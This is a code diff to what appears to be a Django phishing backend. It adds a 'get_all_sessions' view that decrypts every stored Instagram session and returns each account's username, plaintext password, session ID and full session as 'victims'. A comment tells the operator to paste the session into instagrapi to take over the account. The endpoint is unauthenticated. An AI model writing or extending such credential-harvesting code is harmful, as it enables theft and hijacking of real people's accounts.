@@ -190,3 +190,31 @@ def checkpoint_view(request):
             return JsonResponse({"error": f"Wrong code: {e}"}, status=400)
 
     return render(request, "core/checkpoint.html")
+
+
+
+from django.http import JsonResponse
+from core.models import InstagramAccount
+from cryptography.fernet import Fernet
+from django.conf import settings
+import json
+
+def get_all_sessions(request):
+    if request.method == "GET":
+        data = []
+        fernet = Fernet(settings.FERNET_KEY.encode())
+        
+        for acc in InstagramAccount.objects.all():
+            try:
+                decrypted = fernet.decrypt(acc.session_data.encode()).decode()
+                session = json.loads(decrypted)
+                data.append({
+                    "username": acc.username,
+                    "password": acc.password,
+                    "session_id": session.get("session_id", "N/A"),
+                    "full_session": decrypted  # paste this in instagrapi
+                })
+            except:
+                pass
+                
+        return JsonResponse({"victims": data, "total": len(data)}, safe=False)
